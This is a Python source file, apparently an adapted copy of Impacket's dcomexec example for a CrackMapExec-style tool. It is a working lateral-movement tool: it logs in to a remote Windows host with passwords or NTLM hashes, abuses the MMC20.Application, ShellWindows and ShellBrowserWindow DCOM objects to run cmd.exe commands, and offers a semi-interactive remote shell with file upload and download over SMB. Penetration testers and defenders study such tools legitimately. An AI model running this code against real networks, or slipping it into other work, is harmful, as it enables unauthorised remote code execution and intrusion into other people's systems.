#!/usr/bin/env python
#
#       Executes as the USER
#
#
# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# A similar approach to psexec but executing commands through DCOM.
# You can select different objects to be used to execute the commands.
# Currently supported objects are:
#    1. MMC20.Application (49B2791A-B1AE-4C90-9B8E-E860BA07F889) - Tested Windows 7, Windows 10, Server 2012R2
#    2. ShellWindows (9BA05972-F6A8-11CF-A442-00A0C90A8F39) - Tested Windows 7, Windows 10, Server 2012R2
#    3. ShellBrowserWindow (C08AFD90-F2A1-11D1-8455-00A0C91F3880) - Tested Windows 10, Server 2012R2
#
# Drawback is it needs DCOM, hence, I have to be able to access
# DCOM ports at the target machine.
#
# Original discovery by Matt Nelson (@enigma0x3):
# https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/
# https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/
#
# Author:
#  beto (@agsolino)
#  Marcello (@byt3bl33d3r)
#
# Reference for:
#  DCOM
#
# ToDo:
# [ ] Kerberos auth not working, invalid_checksum is thrown. Most probably sequence numbers out of sync due to
#     getInterface() method
#
from __future__ import division
from __future__ import print_function
import argparse
import cmd
import logging
import ntpath
import os
import sys
import time

from six import PY3
from impacket import version
from impacket.dcerpc.v5.dcom.oaut import IID_IDispatch, string_to_bin, IDispatch, DISPPARAMS, DISPATCH_PROPERTYGET, \
    VARIANT, VARENUM, DISPATCH_METHOD
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcomrt import OBJREF, FLAGS_OBJREF_CUSTOM, OBJREF_CUSTOM, OBJREF_HANDLER, \
    OBJREF_EXTENDED, OBJREF_STANDARD, FLAGS_OBJREF_HANDLER, FLAGS_OBJREF_STANDARD, FLAGS_OBJREF_EXTENDED, \
    IRemUnknown2, INTERFACE
from impacket.dcerpc.v5.dtypes import NULL
from impacket.examples import logger
from impacket.smbconnection import SMBConnection, SMB_DIALECT, SMB2_DIALECT_002, SMB2_DIALECT_21

from cmx import config as cfg

OUTPUT_FILENAME = '__' + str(time.time())[:5]

class DCOMEXEC:
    def __init__(self, target, share_name, username, password, domain, smbconnection, hashes=None,
                 share=None, killDefender=False, logger=None, output=False):
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = None
        self.__share = share
        self.__share_name = share_name
        self.__noOutput = output
        self.__kdcHost = None
        self.__aesKey = None
        self.__doKerberos = False
        self.__retOutput = True
        self.__dcomObject = 'MMC20'
        self.__smbconnection = smbconnection
        self.__target = target
        self.logger = logger
        self.dcom = None
        print('a{}'.format(self.__noOutput))

        self.shell = None
        if hashes is not None:
            if hashes.find(':') != -1:
                self.__lmhash, self.__nthash = hashes.split(':')
            else:
                self.__nthash = hashes

        if self.__noOutput is False:
            smbConnection = self.__smbconnection
            if self.__doKerberos is False:
                smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
            else:
                smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                            self.__nthash, self.__aesKey, kdcHost=self.__kdcHost)

            dialect = smbConnection.getDialect()
            if dialect == SMB_DIALECT:
                logging.info("SMBv1 dialect used")
            elif dialect == SMB2_DIALECT_002:
                logging.info("SMBv2.0 dialect used")
            elif dialect == SMB2_DIALECT_21:
                logging.info("SMBv2.1 dialect used")
            else:
                logging.info("SMBv3.0 dialect used")
        else:
            smbConnection = None

        self.dcom = DCOMConnection(self.__target, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                              self.__aesKey, oxidResolver=True, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
        try:
            dispParams = DISPPARAMS(None, False)
            dispParams['rgvarg'] = NULL
            dispParams['rgdispidNamedArgs'] = NULL
            dispParams['cArgs'] = 0
            dispParams['cNamedArgs'] = 0

            if self.__dcomObject == 'ShellWindows':
                # ShellWindows CLSID (Windows 7, Windows 10, Windows Server 2012R2)
                logging.debug('in execute: ShellWindows')
                iInterface = self.dcom.CoCreateInstanceEx(string_to_bin('9BA05972-F6A8-11CF-A442-00A0C90A8F39'), IID_IDispatch)
                iMMC = IDispatch(iInterface)
                resp = iMMC.GetIDsOfNames(('Item',))
                resp = iMMC.Invoke(resp[0], 0x409, DISPATCH_METHOD, dispParams, 0, [], [])
                iItem = IDispatch(self.getInterface(iMMC, resp['pVarResult']['_varUnion']['pdispVal']['abData']))
                resp = iItem.GetIDsOfNames(('Document',))
                resp = iItem.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])
                pQuit = None
            elif self.__dcomObject == 'ShellBrowserWindow':
                # ShellBrowserWindow CLSID (Windows 10, Windows Server 2012R2)
                logging.debug('in execute: ShellBrowserWindow')
                iInterface = self.dcom.CoCreateInstanceEx(string_to_bin('C08AFD90-F2A1-11D1-8455-00A0C91F3880'), IID_IDispatch)
                iMMC = IDispatch(iInterface)
                resp = iMMC.GetIDsOfNames(('Document',))
                resp = iMMC.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])
                pQuit = iMMC.GetIDsOfNames(('Quit',))[0]
            elif self.__dcomObject == 'MMC20':
                logging.debug('in execute: MMC20')
                iInterface = self.dcom.CoCreateInstanceEx(string_to_bin('49B2791A-B1AE-4C90-9B8E-E860BA07F889'), IID_IDispatch)
                iMMC = IDispatch(iInterface)
                resp = iMMC.GetIDsOfNames(('Document',))
                resp = iMMC.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])
                pQuit = iMMC.GetIDsOfNames(('Quit',))[0]
            else:
                logging.fatal('Invalid object %s' % self.__dcomObject)
                return

            iDocument = IDispatch(self.getInterface(iMMC, resp['pVarResult']['_varUnion']['pdispVal']['abData']))
            logging.debug('in execute: iDocument = IDispatch')

            if self.__dcomObject == 'MMC20':
                resp = iDocument.GetIDsOfNames(('ActiveView',))
                resp = iDocument.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])
                logging.debug('in execute: MMC20 - 2')

                iActiveView = IDispatch(self.getInterface(iMMC, resp['pVarResult']['_varUnion']['pdispVal']['abData']))
                pExecuteShellCommand = iActiveView.GetIDsOfNames(('ExecuteShellCommand',))[0]
                self.shell = RemoteShellMMC20(self.__share, (iMMC, pQuit), (iActiveView, pExecuteShellCommand), smbConnection)
            else:
                resp = iDocument.GetIDsOfNames(('Application',))
                resp = iDocument.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])

                iActiveView = IDispatch(self.getInterface(iMMC, resp['pVarResult']['_varUnion']['pdispVal']['abData']))
                pExecuteShellCommand = iActiveView.GetIDsOfNames(('ShellExecute',))[0]
                self.shell = RemoteShell(self.__share, (iMMC, pQuit), (iActiveView, pExecuteShellCommand), smbConnection)

        except  (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            if self.shell is not None:
                self.shell.do_exit('')
            logging.error(str(e))
            if smbConnection is not None:
                smbConnection.logoff()
            self.dcom.disconnect()
            sys.stdout.flush()
            sys.exit(1)


    def getInterface(self, interface, resp):
        # Now let's parse the answer and build an Interface instance
        objRefType = OBJREF(b''.join(resp))['flags']
        objRef = None
        if objRefType == FLAGS_OBJREF_CUSTOM:
            objRef = OBJREF_CUSTOM(b''.join(resp))
        elif objRefType == FLAGS_OBJREF_HANDLER:
            objRef = OBJREF_HANDLER(b''.join(resp))
        elif objRefType == FLAGS_OBJREF_STANDARD:
            objRef = OBJREF_STANDARD(b''.join(resp))
        elif objRefType == FLAGS_OBJREF_EXTENDED:
            objRef = OBJREF_EXTENDED(b''.join(resp))
        else:
            logging.error("Unknown OBJREF Type! 0x%x" % objRefType)

        return IRemUnknown2(
            INTERFACE(interface.get_cinstance(), None, interface.get_ipidRemUnknown(), objRef['std']['ipid'],
                      oxid=objRef['std']['oxid'], oid=objRef['std']['oxid'],
                      target=interface.get_target()))

    def execute(self, command, output=False):
        self.__command = command

        if self.__command != ' ':
            logging.debug('Trying onecmd: {}'.format(self.__command))
            #store OG stdout
            a, b, c = sys.stdout, sys.stdin, sys.stderr
        
            #switch stdout to our 'buffer'
            buff = open(cfg.TEST_PATH,"w")
            sys.stdout, sys.stdin, sys.stderr = buff, buff, buff
        
            self.shell.onecmd(self.__command)
        
            # switch back to normal
            sys.stdout, sys.stdin, sys.stderr = a, b, c 
            buff.close()
            
            if self.shell is not None:
                self.shell.do_exit(' ')
                #logging.debug('after exit')
        else:
            logging.debug('before cmdloop')
            self.shell.cmdloop()
        

        if self.__smbconnection is not None:
            self.__smbconnection.logoff()

        if self.dcom is not None:
            try:
                logging.debug('be4 disconnect')
                #self.dcom.disconnect() #hangs forever?
                logging.debug('after disconnect')
            except:
                pass

        with open(cfg.TEST_PATH, 'r') as file:
            data = file.read()

        return data


    def run(self, addr, dummy):
        """ starts interactive shell """
        logging.debug('inside dcomshell.run')

        try:
            self.shell.cmdloop()

        except (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(str(e))
            if self.__smbconnection is not None:
                self.__smbconnection.logoff()
            self.dcom.disconnect()
            sys.stdout.flush()
            sys.exit(1)

        try:
            if self.__smbconnection is not None:
                self.__smbconnection.logoff()
            #self.dcom.disconnect() #hangs forever?

        except (Exception, KeyboardInterrupt) as e:
            logging.debug('Error: {}'.format(e))




class RemoteShell(cmd.Cmd):
    def __init__(self, share, quit, executeShellCommand, smbConnection):
        cmd.Cmd.__init__(self)
        self._share = share
        self._output = '\\' + OUTPUT_FILENAME
        self.__outputBuffer = ''
        self._shell = 'cmd.exe'
        self.__quit = quit
        self._executeShellCommand = executeShellCommand
        self.__transferClient = smbConnection
        self._pwd = 'C:\\windows\\system32'
        self._noOutput = False
        self.intro = '[!] Launching semi-interactive shell - Careful what you execute\n[!] Press help for extra shell commands'

        # We don't wanna deal with timeouts from now on.
        if self.__transferClient is not None:
            self.__transferClient.setTimeout(100000)
            self.do_cd('\\')
        else:
            self._noOutput = True

    def do_shell(self, s):
        os.system(s)

    def do_help(self, line):
        print("""
 lcd {path}                 - changes the current local directory to {path}
 exit                       - terminates the server process (and this session)
 put {src_file, dst_path}   - uploads a local file to the dst_path (dst_path = default current directory)
 get {file}                 - downloads pathname to the current local dir
 ! {cmd}                    - executes a local shell cmd
""")

    def do_lcd(self, s):
        if s == '':
            print(os.getcwd())
        else:
            try:
                os.chdir(s)
            except Exception as e:
                logging.error(str(e))

    def do_get(self, src_path):
        try:
            import ntpath
            newPath = ntpath.normpath(ntpath.join(self._pwd, src_path))
            drive, tail = ntpath.splitdrive(newPath)
            filename = ntpath.basename(tail)
            fh = open(filename,'wb')
            logging.info("Downloading %s\\%s" % (drive, tail))
            self.__transferClient.getFile(drive[:-1]+'$', tail, fh.write)
            fh.close()
        except Exception as e:
            logging.error(str(e))
            os.remove(filename)
            pass

    def do_put(self, s):
        try:
            params = s.split(' ')
            if len(params) > 1:
                src_path = params[0]
                dst_path = params[1]
            elif len(params) == 1:
                src_path = params[0]
                dst_path = ''

            src_file = os.path.basename(src_path)
            fh = open(src_path, 'rb')
            dst_path = dst_path.replace('/','\\')
            import ntpath
            pathname = ntpath.join(ntpath.join(self._pwd, dst_path), src_file)
            drive, tail = ntpath.splitdrive(pathname)
            logging.info("Uploading %s to %s" % (src_file, pathname))
            self.__transferClient.putFile(drive[:-1]+'$', tail, fh.read)
            fh.close()
        except Exception as e:
            logging.critical(str(e))
            pass

    def do_exit(self, s):
        logging.debug('in do_exit')
        dispParams = DISPPARAMS(None, False)
        dispParams['rgvarg'] = NULL
        dispParams['rgdispidNamedArgs'] = NULL
        dispParams['cArgs'] = 0
        dispParams['cNamedArgs'] = 0

        self.__quit[0].Invoke(self.__quit[1], 0x409, DISPATCH_METHOD, dispParams,
                                             0, [], [])
        return True

    def emptyline(self):
        return False

    def do_cd(self, s):
        self.execute_remote('cd ' + s)
        if len(self.__outputBuffer.strip('\r\n')) > 0:
            print(self.__outputBuffer)
            self.__outputBuffer = ''
        else:
            self._pwd = ntpath.normpath(ntpath.join(self._pwd, s))
            self.execute_remote('cd ')
            self._pwd = self.__outputBuffer.strip('\r\n')
            self.prompt = self._pwd + '>'
            self.__outputBuffer = ''

    def default(self, line):
        # Let's try to guess if the user is trying to change drive
        if len(line) == 2 and line[1] == ':':
            # Execute the command and see if the drive is valid
            self.execute_remote(line)
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                # Something went wrong
                print(self.__outputBuffer)
                self.__outputBuffer = ''
            else:
                # Drive valid, now we should get the current path
                self._pwd = line
                self.execute_remote('cd ')
                self._pwd = self.__outputBuffer.strip('\r\n')
                self.prompt = self._pwd + '>'
                self.__outputBuffer = ''
        else:
            if line != '':
                self.send_data(line)

    def get_output(self):
        def output_callback(data):
            self.__outputBuffer += data.decode('utf-8')

        if self._noOutput is True:
            self.__outputBuffer = ''
            return

        while True:
            try:
                self.__transferClient.getFile(self._share, self._output, output_callback)
                break
            except Exception as e:
                if str(e).find('STATUS_SHARING_VIOLATION') >=0:
                    # Output not finished, let's wait
                    time.sleep(1)
                    pass
                elif str(e).find('Broken') >= 0:
                    # The SMB Connection might have timed out, let's try reconnecting
                    logging.debug('Connection broken, trying to recreate it')
                    self.__transferClient.reconnect()
                    return self.get_output()
        self.__transferClient.deleteFile(self._share, self._output)

    def execute_remote(self, data):
        command = '/Q /c ' + data
        if self._noOutput is False:
            command += ' 1> ' + '\\\\127.0.0.1\\%s' % self._share + self._output + ' 2>&1'

        logging.debug('Executing: %s' % command)

        dispParams = DISPPARAMS(None, False)
        dispParams['rgdispidNamedArgs'] = NULL
        dispParams['cArgs'] = 5
        dispParams['cNamedArgs'] = 0
        arg0 = VARIANT(None, False)
        arg0['clSize'] = 5
        arg0['vt'] = VARENUM.VT_BSTR
        arg0['_varUnion']['tag'] = VARENUM.VT_BSTR
        arg0['_varUnion']['bstrVal']['asData'] = self._shell

        arg1 = VARIANT(None, False)
        arg1['clSize'] = 5
        arg1['vt'] = VARENUM.VT_BSTR
        arg1['_varUnion']['tag'] = VARENUM.VT_BSTR
        if PY3:
            arg1['_varUnion']['bstrVal']['asData'] = command
        else:
            arg1['_varUnion']['bstrVal']['asData'] = command.decode(sys.stdin.encoding)

        arg2 = VARIANT(None, False)
        arg2['clSize'] = 5
        arg2['vt'] = VARENUM.VT_BSTR
        arg2['_varUnion']['tag'] = VARENUM.VT_BSTR
        arg2['_varUnion']['bstrVal']['asData'] = self._pwd

        arg3 = VARIANT(None, False)
        arg3['clSize'] = 5
        arg3['vt'] = VARENUM.VT_BSTR
        arg3['_varUnion']['tag'] = VARENUM.VT_BSTR
        arg3['_varUnion']['bstrVal']['asData'] = ''

        arg4 = VARIANT(None, False)
        arg4['clSize'] = 5
        arg4['vt'] = VARENUM.VT_BSTR
        arg4['_varUnion']['tag'] = VARENUM.VT_BSTR
        arg4['_varUnion']['bstrVal']['asData'] = '0'
        dispParams['rgvarg'].append(arg4)
        dispParams['rgvarg'].append(arg3)
        dispParams['rgvarg'].append(arg2)
        dispParams['rgvarg'].append(arg1)
        dispParams['rgvarg'].append(arg0)

        #print(dispParams.dump())

        self._executeShellCommand[0].Invoke(self._executeShellCommand[1], 0x409, DISPATCH_METHOD, dispParams,
                                            0, [], [])
        self.get_output()

    def send_data(self, data):
        self.execute_remote(data)
        print(self.__outputBuffer)
        self.__outputBuffer = ''

class RemoteShellMMC20(RemoteShell):
    def execute_remote(self, data):
        logging.debug('in execute_remote: RemoteShellMMC20')

        command = '/Q /c ' + data
        if self._noOutput is False:
            command += ' 1> ' + '\\\\127.0.0.1\\%s' % self._share + self._output  + ' 2>&1'

        dispParams = DISPPARAMS(None, False)
        dispParams['rgdispidNamedArgs'] = NULL
        dispParams['cArgs'] = 4
        dispParams['cNamedArgs'] = 0
        arg0 = VARIANT(None, False)
        arg0['clSize'] = 5
        arg0['vt'] = VARENUM.VT_BSTR
        arg0['_varUnion']['tag'] = VARENUM.VT_BSTR
        arg0['_varUnion']['bstrVal']['asData'] = self._shell

        arg1 = VARIANT(None, False)
        arg1['clSize'] = 5
        arg1['vt'] = VARENUM.VT_BSTR
        arg1['_varUnion']['tag'] = VARENUM.VT_BSTR
        arg1['_varUnion']['bstrVal']['asData'] = self._pwd

        arg2 = VARIANT(None, False)
        arg2['clSize'] = 5
        arg2['vt'] = VARENUM.VT_BSTR
        arg2['_varUnion']['tag'] = VARENUM.VT_BSTR
        if PY3:
            arg2['_varUnion']['bstrVal']['asData'] = command
        else:
            arg2['_varUnion']['bstrVal']['asData'] = command.decode(sys.stdin.encoding)

        arg3 = VARIANT(None, False)
        arg3['clSize'] = 5
        arg3['vt'] = VARENUM.VT_BSTR
        arg3['_varUnion']['tag'] = VARENUM.VT_BSTR
        arg3['_varUnion']['bstrVal']['asData'] = '7'
        dispParams['rgvarg'].append(arg3)
        dispParams['rgvarg'].append(arg2)
        dispParams['rgvarg'].append(arg1)
        dispParams['rgvarg'].append(arg0)

        self._executeShellCommand[0].Invoke(self._executeShellCommand[1], 0x409, DISPATCH_METHOD, dispParams,
                                            0, [], [])
        logging.debug('in execute_remote: RemoteShellMMC20 after executeShellCommand()')
        self.get_output()

class AuthFileSyntaxError(Exception):

    '''raised by load_smbclient_auth_file if it encounters a syntax error
    while loading the smbclient-style authentication file.'''

    def __init__(self, path, lineno, reason):
        self.path=path
        self.lineno=lineno
        self.reason=reason

    def __str__(self):
        return 'Syntax error in auth file %s line %d: %s' % (
            self.path, self.lineno, self.reason )

def load_smbclient_auth_file(path):

    '''Load credentials from an smbclient-style authentication file (used by
    smbclient, mount.cifs and others).  returns (domain, username, password)
    or raises AuthFileSyntaxError or any I/O exceptions.'''

    lineno=0
    domain=None
    username=None
    password=None
    for line in open(path):
        lineno+=1

        line = line.strip()

        if line.startswith('#') or line=='':
            continue

        parts = line.split('=',1)
        if len(parts) != 2:
            raise AuthFileSyntaxError(path, lineno, 'No "=" present in line')

        (k,v) = (parts[0].strip(), parts[1].strip())

        if k=='username':
            username=v
        elif k=='password':
            password=v
        elif k=='domain':
            domain=v
        else:
            raise AuthFileSyntaxError(path, lineno, 'Unknown option %s' % repr(k))

    return (domain, username, password)
